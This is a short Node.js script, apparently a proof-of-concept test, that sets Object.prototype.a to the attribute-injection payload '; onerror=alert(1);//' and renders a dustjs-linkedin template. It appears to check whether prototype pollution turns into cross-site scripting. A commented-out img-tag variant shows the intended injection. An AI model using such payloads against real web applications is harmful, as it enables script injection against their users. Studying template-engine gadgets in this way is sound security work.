var express = require('express');
var dust = require('dustjs-linkedin');
var app = express();


// Arbitrary Value Interpolation
// Object.prototype.rootdir = "; onerror=alert(1);//"
Object.prototype.a = "; onerror=alert(1);//"


// var tmpl = dust.compile("{#names}<img src={rootdir}/{name}>{~n}{/names}", "templateName");
var tmpl = dust.compile("<p>{a}</p>{#b}{c}{~n}{/b}", "templateName");
dust.loadSource(tmpl);


// app.get('/', function(req, res) {
    // dust.render("array", { title: "Sir", names: [ { name: "Moe" }, { name: "Larry" }, { name: "Curly" } ] }, function(err, out) {
    //     console.log(out);
    //     // res.send(out);
    // })
//     });
// });

// dust.render("templateName", { rootdir: "gg", names: [ { name: "Moe" }, { name: "Larry" }, { name: "Curly" } ] }, function(err, out) {
//     if(err) console.error(err);
//     else console.log(out);
// });


dust.render("templateName", { a: "gg", b: [{c: "xx"}] }, function(err, out) {
    if(err) console.error(err);
    else console.log(out);
});

// var server = app.listen(3000, function() {
//     console.log('Listening on port %d', server.address().port);
// });